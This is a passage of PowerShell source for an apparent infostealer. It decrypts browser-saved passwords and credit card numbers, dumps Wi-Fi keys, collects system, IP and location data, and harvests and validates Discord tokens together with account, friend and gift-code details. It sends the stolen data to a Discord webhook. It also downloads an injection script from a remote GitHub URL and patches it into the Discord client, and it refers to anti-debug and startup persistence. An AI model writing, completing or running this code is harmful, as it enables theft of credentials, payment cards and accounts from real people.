    if (Test-Path $webDataPath) {
        $tempDbPath = [System.IO.Path]::GetTempFileName()
        try {
            Copy-Item -Path $webDataPath -Destination $tempDbPath -Force
            $db = Open-SQLiteDatabase -Path $tempDbPath
            $result = Execute-SQL -database $db -Query "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            $cards = $result | ForEach-Object {
                $decryptedNumber = Decrypt-Password ([System.Convert]::FromBase64String($_.card_number_encrypted)) $masterKey
                [PSCustomObject]@{
                    Browser   = $browser
                    Name     = $_.name_on_card
                    ExpMonth = $_.expiration_month
                    ExpYear  = $_.expiration_year
                    Number   = $decryptedNumber
                }
            }
            return $cards
        } finally {
            Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        }
    }
    return $null
}

# Function to get login data
function Get-BrowserLogins {
    param(
        [Parameter(Mandatory=$true)]
        [string]$BrowserPath,
        [Parameter(Mandatory=$true)]
        [string]$Browser,
        [Parameter(Mandatory=$true)]
        [byte[]]$MasterKey
    )
    
    $loginDataPath = Join-Path $BrowserPath "Default\Login Data"
    if (-not (Test-Path $loginDataPath)) {
        return $null
    }

    $tempDbPath = [System.IO.Path]::GetTempFileName()
    try {
        Copy-Item -Path $loginDataPath -Destination $tempDbPath -Force
        $db = Open-SQLiteDatabase -Path $tempDbPath
        $result = Execute-SQL -database $db -Query "SELECT action_url, username_value, password_value FROM logins"
        
        $entries = $result | ForEach-Object {
            $decryptedPassword = $null
            if ($_.'password_value') {
                try {
                    $encryptedBytes = [System.Convert]::FromBase64String($_.password_value)
                    $decryptedPassword = Decrypt-Password $encryptedBytes $MasterKey
                }
                catch {
                    Write-Warning "Failed dcp"
                }
            }

            [PSCustomObject]@{
                URL = $_.action_url
                Username = $_.username_value
                Password = $decryptedPassword
                Browser = $Browser
            }
        }
        return $entries
    }
    catch {
        Write-Error "Failed to get logins for $Browser : $_"
        return $null
    }
    finally {
        Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
    }
}
#endregion

#region System Information
function Get-WiFiPasswords {
    # Retrieve the list of Wi-Fi profiles.
    $profilesOutput = netsh wlan show profiles 2>&1
    $profileNames = @()

    # Extract profile names from each line.
    foreach ($line in $profilesOutput -split "`n") {
        if ($line -match "All User Profile\s*:\s*(.+)") {
            $profileNames += $matches[1].Trim()
        }
    }

    $results = @()

    # For each profile, retrieve the key (password) information.
    foreach ($profile in $profileNames) {
        $profileOutput = netsh wlan show profile name="$profile" key=clear 2>&1
        $password = "N/A"
        foreach ($line in $profileOutput -split "`n") {
            if ($line -match "Key Content\s*:\s*(.+)") {
                $password = $matches[1].Trim()
                break
            }
        }
        # Create a custom object for this network.
        $results += [PSCustomObject]@{
            SSID     = $profile
            Password = $password
        }
    }
    return $results
}

function Get-UserData {
    $displayName = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    
    $value = "``````Display Name: $displayName`nHostname: $hostname`nUsername: $username``````"
    
    return @{
        name = ":bust_in_silhouette: User"
        value = $value
        inline = $false
    }
}

function Get-SystemData {
    # Get OS info
    $os = (Get-WmiObject -Class Win32_OperatingSystem).Version + " " + (Get-WmiObject -Class Win32_OperatingSystem).Caption + " " + (Get-WmiObject -Class Win32_OperatingSystem).BuildNumber
    
    # Get CPU info
    $cpu = (Get-WmiObject Win32_Processor).Name
    
    # Get GPU info
    $gpu = (Get-WmiObject Win32_VideoController).Name
    
    # Get RAM info
    $totalRam = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $ram = "$totalRam GB"
    
    # Get HWID (using motherboard serial)
    $hwid = (Get-WmiObject Win32_BaseBoard).SerialNumber
    
    $value = "``````OS: $os`nCPU: $cpu`nGPU: $gpu`nRAM: $ram`nHWID: $hwid``````"
    
    return @{
        name = "<:CPU:1004131852208066701> System"
        value = $value
        inline = $false
    }
}

function Get-DiskData {
    try {
        $partitions = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"
        $header = "{0,-9} {1,-7} {2,-7} {3,-5}`n" -f "Drive", "Free", "Total", "Use%"
        $lines = $header
        
        foreach ($p in $partitions) {
            $freeGB = [math]::Round($p.FreeSpace / 1GB)
            $totalGB = [math]::Round($p.Size / 1GB)
            $usedPercent = [math]::Round(($p.Size - $p.FreeSpace) * 100 / $p.Size, 1)
            $line = "{0,-9} {1,-7} {2,-7} {3,-5:N1}%`n" -f $p.DeviceID, $freeGB, $totalGB, $usedPercent
            $lines += $line
        }
        
        return @{
            name = ":floppy_disk: Disk"
            value = "``````$lines``````"
            inline = $false
        }
    }
    catch {
        return @{
            name = ":floppy_disk: Disk"
            value = "Unable to get disk info"
            inline = $false
        }
    }
}

function Get-NetworkData {
    try {
        # Get public IP
        $ipResponse = Invoke-RestMethod -Uri "https://www.cloudflare.com/cdn-cgi/trace"
        $ip = ($ipResponse -split "`n" | Where-Object { $_ -match "ip=" }).Split('=')[1]
        
        # Get MAC address
        $mac = "Unknown"
        $interfaces = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
        if ($interfaces) {
            $mac = $interfaces[0].MACAddress
        }
        
        # Get geo data
        $geoData = Invoke-RestMethod -Uri "https://ipapi.co/$ip/json/"
        
        $value = "``````"
        $value += "IP Address: $ip`n"
        $value += "MAC Address: $mac`n"
        $value += "Country: $($geoData.country_name)`n"
        $value += "Region: $($geoData.region)`n"
        $value += "City: $($geoData.city) ($($geoData.postal))`n"
        $value += "ISP: $($geoData.asn)``````"
        
        return @{
            name = ":satellite: Network"
            value = $value
            inline = $false
        }
    }
    catch {
        return @{
            Bame = ":satellite: Network"
            Value = "Unable to get network info"
            Inline = $false
        }
    }
}
#endregion

#region Discord Token Extraction
# --- Helper function: add token if not already present ---
function Add-Token {
    param (
        [string]$token
    )
    if ($global:FoundTokens -notcontains $token) {
        $global:FoundTokens += $token
    }
}

# --- Function: Search-InFile ---
function Search-InFile {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    try {
        $content = Get-Content -Path $FilePath -Raw -ErrorAction Stop
    }
    catch {
        return
    }

    # Process plaintext tokens
    $plainMatches = [regex]::Matches($content, $tokenRegex)
    foreach ($match in $plainMatches) {
        Add-Token $match.Value
    }

    # Process encrypted tokens
    $encryptedMatches = [regex]::Matches($content, $encryptedRegex)
    foreach ($match in $encryptedMatches) {
        $parts = $match.Value -split "dQw4w9WgXcQ:"
        if ($parts.Length -lt 2) { continue }
        $b64data = $parts[1]
        try {
            $decoded = [System.Convert]::FromBase64String($b64data)
        }
        catch {
            continue
        }
        if ($decoded.Length -lt (15 + 16)) { continue }

        # Extract components:
        $iv = $decoded[3..14]                           # bytes 3-14: 12-byte IV
        $tag = $decoded[($decoded.Length - 16)..($decoded.Length - 1)]  # last 16 bytes: tag
        $ciphertext = $decoded[15..($decoded.Length - 17)]  # bytes between IV and tag

        # Determine the application folder from the file path (Discord-based apps)
        if ($FilePath -match "\\(discord|discordcanary|discordptb|lightcord)\\") {
            if ($FilePath -match "\\discordcanary\\") {
                $appName = "discordcanary"
            } elseif ($FilePath -match "\\discordptb\\") {
                $appName = "discordptb"
            } elseif ($FilePath -match "\\lightcord\\") {
                $appName = "lightcord"
            } else {
                $appName = "discord"
            }
            $localStatePath = Join-Path $env:APPDATA "$appName\Local State"
            if (-not (Test-Path $localStatePath)) { continue }
            try {
                $localStateContent = Get-Content -Path $localStatePath -Raw -ErrorAction Stop
                $localState = $localStateContent | ConvertFrom-Json
            }
            catch {
                continue
            }
            $encryptedKeyBase64 = $localState.os_crypt.encrypted_key
            try {
                $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)
            }
            catch {
                continue
            }
            if ($encryptedKeyBytes.Length -lt 5) { continue }
            # Remove the "DPAPI" prefix (first 5 bytes)
            $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
            try {
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $encryptedKeyBytes, 
                                $null, 
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                             )
            }
            catch {
                continue
            }
        }
        else {
            continue
        }

        try {
            $decryptedToken = [AesGcmDecryptor]::Decrypt($masterKey, $iv, $ciphertext, $tag)
        }
        catch {
            continue
        }
        if ($decryptedToken -match $tokenRegex) {
            Add-Token $decryptedToken
        }
    }
}

# --- Function: Search-Directory (recursive file search) ---
function Search-Directory {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    if (-not (Test-Path $DirectoryPath)) { return }
    try {
        $files = Get-ChildItem -Path $DirectoryPath -Recurse -Include *.log,*.ldb -ErrorAction SilentlyContinue
    }
    catch {
        return
    }
    foreach ($file in $files) {
        Search-InFile -FilePath $file.FullName
    }
}

# --- Function: Validate-Token ---
function Validate-Token {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Token
    )
    $url = "https://discord.com/api/v9/users/@me"
    try {
        # Use Invoke-WebRequest with basic parsing enabled
        $ProgressPreference = 'SilentlyContinue'
        $response = Invoke-WebRequest -Uri $url -Headers @{ "Authorization" = $Token } -Method GET -UseBasicParsing -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            return $true
        }
        else {
            return $false
        }
    }
    catch {
        return $false
    }
}

function Get-TokenInfo {
    [CmdletBinding()]
    param(
        # Provide a Discord token string.
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    # --- Get basic user info ---
    try {
        $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" `
                                      -Headers @{ Authorization = $Token } `
                                      -Method Get -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to retrieve user info. The token may be invalid."
        return $null
    }

    # --- Helper: Determine Nitro type based on premium_type ---
    function Get-NitroType {
        param([int]$premiumType)
        switch ($premiumType) {
            1 { return "Nitro Classic" }
            2 { return "Nitro" }
            3 { return "Nitro Basic" }
            default { return "None" }
        }
    }
    $nitroType = Get-NitroType -premiumType $userInfo.premium_type

    # --- Helper: Construct the avatar URL (prefers GIF if available) ---
    function Get-AvatarURL {
        param($user)
        if ([string]::IsNullOrEmpty($user.avatar)) {
            return ""
        }
        $baseUrl = "https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar)"
        $gifUrl = "$baseUrl.gif"
        try {
            $headResp = Invoke-WebRequest -Uri $gifUrl -Method Head -ErrorAction Stop
            if ($headResp.StatusCode -eq 200) {
                return $gifUrl
            }
        }
        catch {
            # If the HEAD request fails, fall back to PNG.
        }
        return "$baseUrl.png"
    }
    $avatarUrl = Get-AvatarURL -user $userInfo

    # --- Helper: Calculate badge emojis based on public_flags ---
    function Get-Badges {
        param([int]$flags)
        $badges = @()
        $mapping = @(
            @{ Name = "DISCORD_EMPLOYEE";       Emoji = "<:staff:968704541946167357>";       Shift = 0 },
            @{ Name = "DISCORD_PARTNER";        Emoji = "<:partner:968704542021652560>";      Shift = 1 },
            @{ Name = "HYPESQUAD_EVENTS";       Emoji = "<:hypersquad_events:968704541774192693>"; Shift = 2 },
            @{ Name = "BUG_HUNTER_LEVEL_1";     Emoji = "<:bug_hunter_1:968704541677723648>";    Shift = 3 },
            @{ Name = "HOUSE_BRAVERY";          Emoji = "<:hypersquad_1:968704541501571133>";     Shift = 6 },
            @{ Name = "HOUSE_BRILLIANCE";       Emoji = "<:hypersquad_2:968704541883261018>";     Shift = 7 },
            @{ Name = "HOUSE_BALANCE";          Emoji = "<:hypersquad_3:968704541874860082>";     Shift = 8 },
            @{ Name = "EARLY_SUPPORTER";        Emoji = "<:early_supporter:968704542126510090>";  Shift = 9 },
            @{ Name = "BUG_HUNTER_LEVEL_2";     Emoji = "<:bug_hunter_2:968704541774217246>";    Shift = 14 },
            @{ Name = "VERIFIED_BOT_DEVELOPER"; Emoji = "<:verified_dev:968704541702905886>";     Shift = 17 },
            @{ Name = "ACTIVE_DEVELOPER";       Emoji = "<:Active_Dev:1045024909690163210>";      Shift = 22 },
            @{ Name = "CERTIFIED_MODERATOR";    Emoji = "<:certified_moderator:988996447938674699>"; Shift = 18 },
            @{ Name = "SPAMMER";                Emoji = "⌨";                                    Shift = 20 }
        )
        foreach ($item in $mapping) {
            if (($flags -band (1 -shl $item.Shift)) -ne 0) {
                $badges += $item.Emoji
            }
        }
        return $badges -join " "
    }
    $badges = Get-Badges -flags $userInfo.public_flags

    # --- Helper: Get HQ Guilds ---
    function Get-HQGuilds {
        param([string]$authToken)
        $guildsUrl = "https://discord.com/api/v9/users/@me/guilds?with_counts=true"
        try {
            $guilds = Invoke-RestMethod -Uri $guildsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ""
        }
        $lines = @()
        foreach ($guild in $guilds) {
            # Skip guilds if the bot-like permission (0x8) isn’t present or the member count is too low.
            $permissions = 0
            if ([long]::TryParse($guild.permissions, [ref] $permissions)) {
                if (($permissions -band 0x8) -eq 0) { continue }
            }
            if ($guild.approximate_member_count -lt 100) { continue }
            # Attempt to get an invite link; if none, use a fallback.
            $inviteUrl = "https://discord.com/api/v8/guilds/$($guild.id)/invites"
            try {
                $inviteResponse = Invoke-RestMethod -Uri $inviteUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
                if ($inviteResponse.Count -gt 0) {
                    $inviteCode = $inviteResponse[0].code
                    $inviteLink = "https://discord.gg/$inviteCode"
                }
                else {
                    $inviteLink = "https://youtu.be/dQw4w9WgXcQ"
                }
            }
            catch {
                $inviteLink = "https://youtu.be/dQw4w9WgXcQ"
            }
            $line = "**$($guild.name) ($($guild.id))** - Members: $($guild.approximate_member_count), Invite: $inviteLink"
            $lines += $line
            if (($lines -join "`n").Length -ge 1024) { break }
        }
        return $lines -join "`n"
    }
    $hqGuilds = Get-HQGuilds -authToken $Token

    # --- Helper: Get HQ Friends (relationships with badge info) ---
    function Get-HQFriends {
        param([string]$authToken)
        $friendsUrl = "https://discord.com/api/v8/users/@me/relationships"
        try {
            $friends = Invoke-RestMethod -Uri $friendsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ""
        }
        $lines = @()
        foreach ($friend in $friends) {
            if ($friend.user) {
                $friendBadges = Get-Badges $friend.user.public_flags
                if (-not [string]::IsNullOrEmpty($friendBadges)) {
                    $line = "$friendBadges - $($friend.user.username)#$($friend.user.discriminator) ($($friend.user.id))"
                    $lines += $line
                }
            }
            if (($lines -join "`n").Length -ge 1024) { break }
        }
        return $lines -join "`n"
    }
    $hqFriends = Get-HQFriends -authToken $Token

    # --- Helper: Get Gift Codes ---
    function Get-GiftCodes {
        param([string]$authToken)
        $giftUrl = "https://discord.com/api/v9/users/@me/outbound-promotions/codes"
        try {
            $codes = Invoke-RestMethod -Uri $giftUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ""
        }
        $lines = @()
        foreach ($code in $codes) {
            $line = ":gift: ``$($code.promotion.outbound_title)`` - :ticket: ``$($code.code)``"
            $lines += $line
            if (($lines -join "`n").Length -ge 1024) { break }
        }
        return $lines -join "`n`n"
    }
    $giftCodes = Get-GiftCodes -authToken $Token

    # --- Billing information is not retrieved in this example; default to "None" ---
    $billing = "None"

    # --- Build the Token Info object ---
    $tokenInfo = [PSCustomObject]@{
        Username  = "$($userInfo.username)#$($userInfo.discriminator)"
        Token     = $Token
        Nitro     = $nitroType
        Billing   = $billing
        MFA       = $userInfo.mfa_enabled
        Email     = $userInfo.email
        Phone     = $userInfo.phone
        Avatar    = $avatarUrl
        HQGuilds  = $hqGuilds
        HQFriends = $hqFriends
        GiftCodes = $giftCodes
        Badges    = $badges
    }

    return $tokenInfo
}

function Get-DiscordTokens{
    # --- Global regex patterns and token storage ---
    $tokenRegex     = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
    $encryptedRegex = 'dQw4w9WgXcQ:[^"]*'
    $global:FoundTokens = @()

    # --- Define base paths (using APPDATA and LOCALAPPDATA) ---
    $roaming = $env:APPDATA
    $local   = $env:LOCALAPPDATA

    # Hashtable of directories to search (Discord variants and browsers)
    $paths = @{
        "Discord"              = Join-Path $roaming "discord\Local Storage\leveldb"
        "Discord Canary"       = Join-Path $roaming "discordcanary\Local Storage\leveldb"
        "Lightcord"            = Join-Path $roaming "Lightcord\Local Storage\leveldb"
        "Discord PTB"          = Join-Path $roaming "discordptb\Local Storage\leveldb"
        "Opera"                = Join-Path $roaming "Opera Software\Opera Stable\Local Storage\leveldb"
        "Opera GX"             = Join-Path $roaming "Opera Software\Opera GX Stable\Local Storage\leveldb"
        "Amigo"                = Join-Path $local   "Amigo\User Data\Local Storage\leveldb"
        "Torch"                = Join-Path $local   "Torch\User Data\Local Storage\leveldb"
        "Kometa"               = Join-Path $local   "Kometa\User Data\Local Storage\leveldb"
        "Orbitum"              = Join-Path $local   "Orbitum\User Data\Local Storage\leveldb"
        "CentBrowser"          = Join-Path $local   "CentBrowser\User Data\Local Storage\leveldb"
        "7Star"                = Join-Path $local   "7Star\7Star\User Data\Local Storage\leveldb"
        "Sputnik"              = Join-Path $local   "Sputnik\Sputnik\User Data\Local Storage\leveldb"
        "Vivaldi"              = Join-Path $local   "Vivaldi\User Data\Default\Local Storage\leveldb"
        "Chrome SxS"           = Join-Path $local   "Google\Chrome SxS\User Data\Local Storage\leveldb"
        "Chrome"               = Join-Path $local   "Google\Chrome\User Data\Default\Local Storage\leveldb"
        "Chrome1"              = Join-Path $local   "Google\Chrome\User Data\Profile 1\Local Storage\leveldb"
        "Chrome2"              = Join-Path $local   "Google\Chrome\User Data\Profile 2\Local Storage\leveldb"
        "Chrome3"              = Join-Path $local   "Google\Chrome\User Data\Profile 3\Local Storage\leveldb"
        "Chrome4"              = Join-Path $local   "Google\Chrome\User Data\Profile 4\Local Storage\leveldb"
        "Chrome5"              = Join-Path $local   "Google\Chrome\User Data\Profile 5\Local Storage\leveldb"
        "Epic Privacy Browser" = Join-Path $local   "Epic Privacy Browser\User Data\Local Storage\leveldb"
        "Microsoft Edge"       = Join-Path $local   "Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        "Uran"                 = Join-Path $local   "uCozMedia\Uran\User Data\Local Storage\leveldb"
        "Yandex"               = Join-Path $local   "Yandex\YandexBrowser\User Data\Local Storage\leveldb"
        "Brave"                = Join-Path $local   "BraveSoftware\Brave-Browser\User Data\Local Storage\leveldb"
        "Iridium"              = Join-Path $local   "Iridium\User Data\Default\Local Storage\leveldb"
    }

    # --- Loop through directories and search for tokens ---
    foreach ($name in $paths.Keys) {
        $dirPath = $paths[$name]
        if (Test-Path $dirPath) {
            Search-Directory -DirectoryPath $dirPath
        }
    }

    # Additionally, search Firefox profiles
    $firefoxProfilesPath = Join-Path $roaming "Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfilesPath) {
        try {
            $ffFiles = Get-ChildItem -Path $firefoxProfilesPath -Recurse -Include *.sqlite -ErrorAction SilentlyContinue
        }
        catch {
            $ffFiles = @()
        }
        foreach ($file in $ffFiles) {
            Search-InFile -FilePath $file.FullName
        }
    }

    # --- Loop through all extracted tokens and check if they are valid ---
    $ValidTokens = @()
    foreach ($token in $global:FoundTokens) {
        if (Validate-Token -Token $token) {
            $ValidTokens += $token
        }
        else {
        }
    }

    # --- Output the valid tokens ---
    if ($ValidTokens.Count -gt 0) {
        return $ValidTokens
    }
    else {
        return $null
    }
}
#endregion

#region Discord Sending
function Send-FileToDiscord {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [string]$webhookUrl,
        [string]$username,
        [string]$avatar_url
    )

    if (-not (Test-Path $FilePath)) {
        Write-Error "File not found: $FilePath"
        return
    }

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = New-Object System.Collections.ArrayList

    # Add file content
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileName = Split-Path $FilePath -Leaf
    $fileContent = [Convert]::ToBase64String($fileBytes)

    [void]$bodyLines.Add("--$boundary")
    [void]$bodyLines.Add("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"")
    [void]$bodyLines.Add("Content-Type: application/octet-stream")
    [void]$bodyLines.Add("")
    [void]$bodyLines.Add([System.Text.Encoding]::UTF8.GetString($fileBytes))

    # Add payload_json
    $payload = @{
        content = "Vault file"
        username = $username
        avatar_url = $avatar_url
    }
    $payloadJson = $payload | ConvertTo-Json -Compress

    [void]$bodyLines.Add("--$boundary")
    [void]$bodyLines.Add("Content-Disposition: form-data; name=`"payload_json`"")
    [void]$bodyLines.Add("")
    [void]$bodyLines.Add($payloadJson)
    [void]$bodyLines.Add("--$boundary--")

    $body = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF))

    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    }
    catch {
        Write-Error "Failed to upload file to Discord: $_"
    }
}

function Send-DiscordEmbed {
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Embed,
        [string]$webhookUrl,
        [string]$username,
        [string]$avatar_url
    )

    $payload = @{
        username = $username
        avatar_url = $avatar_url
        embeds = @($Embed)
    }

    $payloadJson = $payload | ConvertTo-Json -Depth 10 -Compress 
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json; charset=utf-8'
    }
    catch {
        Write-Error "Failed to send Discord embed: $_"
    }
}

function Create-BrowserEmbed {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FileSizesJson
    )

    # Convert the JSON string to a PowerShell object.
    $fileSizes = $FileSizesJson | ConvertFrom-Json

    # Build the files string (each file on its own line)
    $filesValue = ($fileSizes | ForEach-Object {
        "**$($_.FileName)** - ``$($_.SizeBytes) bytes``"
    }) -join "`n"
    
    # Get system information
    $userData = Get-UserData
    $systemData = Get-SystemData
    $diskData = Get-DiskData
    $networkData = Get-NetworkData

    # Create fields array
    $fields = @(
        @{
            name = ":file_folder: Files Included"
            value = $filesValue
            inline = $false
        },
        $userData,
        $systemData,
        $diskData,
        $networkData
    )

    # Create embed
    $embed = @{
        title = ":desktop: Browser Data Report"
        description = "A zipped folder containing extracted browser data is attached below."
        color = 0x3498db
        fields = $fields
        footer = @{
            text = "Data extraction completed successfully"
        }
        timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }

    return $embed
}

function Create-TokenEmbed {
    [CmdletBinding()]
    param(
        # $TokenInfo should be an object or hashtable with the following properties:
        # Username, Token, Nitro, Billing, MFA, Email, Phone, Avatar, HQGuilds, HQFriends, GiftCodes, Badges
        [Parameter(Mandatory = $true)]
        $TokenInfo
    )

    # Helper function: returns "None" if the input string is empty.
    function Format-Value {
        param([string]$s)
        if ([string]::IsNullOrEmpty($s)) {
            return "None"
        }
        return $s
    }

    # Determine MFA status as a string.
    $mfaStatus = "False"
    if ($TokenInfo.MFA -eq $true) {
        $mfaStatus = "True"
    }

    # Build an array of embed fields.
    $fields = @()

    # Field 1: Token (displayed as a code block)
    $fields += @{
        name   = "<a:pinkcrown:996004209667346442> Token:"
        value  = "``````$($TokenInfo.Token)``````"
        inline = $false
    }

    # Field 2: Nitro
    $fields += @{
        name   = "<a:nitroboost:996004213354139658> Nitro:"
        value  = $TokenInfo.Nitro
        inline = $true
    }

    # Field 3: Badges (use Format-Value to substitute empty strings)
    $fields += @{
        name   = "<a:redboost:996004230345281546> Badges:"
        value  = (Format-Value $TokenInfo.Badges)
        inline = $true
    }

    # Field 4: Billing
    $fields += @{
        name   = "<a:pinklv:996004222090891366> Billing:"
        value  = (Format-Value $TokenInfo.Billing)
        inline = $true
    }

    # Field 5: MFA
    $fields += @{
        name   = "<:mfa:1021604916537602088> MFA:"
        value  = $mfaStatus
        inline = $true
    }

    # Field 6: Spacer (using a zero-width space character)
    $fields += @{
        name   = [char]0x200b
        value  = [char]0x200b
        inline = $false
    }

    # Field 7: Email
    $fields += @{
        name   = "<a:rainbowheart:996004226092245072> Email:"
        value  = (Format-Value $TokenInfo.Email)
        inline = $true
    }

    # Field 8: Phone
    $fields += @{
        name   = "<:starxglow:996004217699434496> Phone:"
        value  = (Format-Value $TokenInfo.Phone)
        inline = $true
    }

    # Field 9: Spacer
    $fields += @{
        name   = [char]0x200b
        value  = [char]0x200b
        inline = $false
    }

    # If HQGuilds is not empty, add a field for it and another spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.HQGuilds)) {
        $fields += @{
            name   = "<a:earthpink:996004236531859588> HQ Guilds:"
            value  = $TokenInfo.HQGuilds
            inline = $false
        }
        $fields += @{
            name   = [char]0x200b
            value  = [char]0x200b
            inline = $false
        }
    }

    # If HQFriends is not empty, add a field for it and a spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.HQFriends)) {
        $fields += @{
            name   = "<a:earthpink:996004236531859588> HQ Friends:"
            value  = $TokenInfo.HQFriends
            inline = $false
        }
        $fields += @{
            name   = [char]0x200b
            value  = [char]0x200b
            inline = $false
        }
    }

    # If GiftCodes is not empty, add a field for it and a spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.GiftCodes)) {
        $fields += @{
            name   = "<a:gift:1021608479808569435> Gift Codes:"
            value  = $TokenInfo.GiftCodes
            inline = $false
        }
        $fields += @{
            name   = "\u200b"
            value  = "\u200b"
            inline = $false
        }
    }

    # Build the final Discord embed as a hashtable.
    $embed = @{
        title     = $TokenInfo.Username
        color     = 0x3498db
        thumbnail = @{ url = $TokenInfo.Avatar }
        fields    = $fields
        footer    = @{ text = "Token info gathered" }
        timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }

    return $embed
}

function Create-AllDoneEmbed {
    param(
        [Parameter(Mandatory=$true)]
        [bool]$AntiDebugStatus,
        [Parameter(Mandatory=$true)]
        [bool]$BrowserDataStatus,
        [Parameter(Mandatory=$true)]
        [bool]$WifiPasswordStatus,
        [Parameter(Mandatory=$true)]
        [bool]$TokenStatus,
        [Parameter(Mandatory=$true)]
        [bool]$InjectStatus,
        [Parameter(Mandatory=$true)]
        [bool]$StartUpStatus
    )

    # Create fields array
    $fields = @(
        @{
            name = ":shield: Anti-Debug Status"
            value = if ($AntiDebugStatus) { "Success" } else { "Failed" }
            inline = $true
        },
        @{
            name = ":globe_with_meridians: Browser Data Status"
            value = if ($BrowserDataStatus) { "Success" } else { "Failed" }
            inline = $true
        },
        @{
            name = ":satellite: WiFi Password Status"
            value = if ($WifiPasswordStatus) { "Success" } else { "Failed" }
            inline = $true
        },
        @{
            name = ":key: Token Status"
            value = if ($TokenStatus) { "Success" } else { "Failed" }
            inline = $true
        },
        @{
            name = ":syringe: Inject Status"
            value = if ($InjectStatus) { "Success" } else { "Failed" }
            inline = $true
        },
        @{
            name = ":rocket: StartUp Status"
            value = if ($StartUpStatus) { "Success" } else { "Failed" }
            inline = $true
        }
    )

    # Create embed
    $embed = @{
        title = "Data Extraction Completed"
        color = 0x3498db
        fields = $fields
        footer = @{
            text = "Data extraction completed successfully"
        }
        timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }

    return $embed
}

#endregion

#region Discord injection
function Invoke-DiscordInjection {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Webhook
    )

    # Ensure LOCALAPPDATA is set.
    $localAppData = $env:LOCALAPPDATA
    if ([string]::IsNullOrWhiteSpace($localAppData)) {
        Write-Error "LOCALAPPDATA environment variable not set."
        return
    }

    # List of Discord directories to check.
    $discordDirs = @(
        (Join-Path $localAppData "Discord"),
        (Join-Path $localAppData "DiscordCanary"),
        (Join-Path $localAppData "DiscordPTB"),
        (Join-Path $localAppData "DiscordDevelopment")
    )

    # Download the injection code.
    $codeUrl = "https://raw.githubusercontent.com/greenstorm5417/BitThief/refs/heads/main/injection/injection.js"
    try {
        $response = Invoke-WebRequest -Uri $codeUrl -UseBasicParsing -ErrorAction Stop
        $injectionCode = $response.Content
    }
    catch {
        Write-Error "Failed to download injection code: $_"
        return
    }

    # Kill any running Discord processes.
    try {
        Get-Process |
            Where-Object { $_.Name.ToLower().Contains("discord") } |
            ForEach-Object {
                try {
                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                }
                catch { }
            }
    }
    catch { }

    # --- Helper: Get core folder info from a Discord install directory ---
    function Get-CoreInfo {
        param([string]$DiscordDir)
        # Loop through directories starting with "app-"
        $appDirs = Get-ChildItem -Path $DiscordDir -Directory -Filter "app-*"
        foreach ($app in $appDirs) {
            $modulesDir = Join-Path $app.FullName "modules"
            if (-not (Test-Path $modulesDir)) { continue }
            $moduleDirs = Get-ChildItem -Path $modulesDir -Directory
            foreach ($mod in $moduleDirs) {
                # Look for a module whose name starts with "discord_desktop_core"
                if ($mod.Name -match "^discord_desktop_core") {
                    $corePath = Join-Path $mod.FullName "discord_desktop_core"
                    $indexPath = Join-Path $corePath "index.js"
                    if (Test-Path $indexPath) {
                        # Return an array: [0] = corePath, [1] = version (i.e. module folder name)
                        return ,@($corePath, $mod.Name)
                    }
                }
            }
        }
        return $null
    }

    # --- Helper: Restart Discord using Update.exe ---
    function Start-Discord {
        param([string]$DiscordDir)
        $updatePath = Join-Path $DiscordDir "Update.exe"
        # The executable name is the Discord folder’s leaf name with a ".exe" extension.
        $exeName = (Split-Path $DiscordDir -Leaf) + ".exe"
        $appDirs = Get-ChildItem -Path $DiscordDir -Directory -Filter "app-*"
        foreach ($app in $appDirs) {
            $exePath = Join-Path $app.FullName $exeName
            if (Test-Path $exePath) {
                try {
                    # Use Update.exe to start the Discord executable.
                    Start-Process -FilePath $updatePath -ArgumentList "--processStart", $exePath
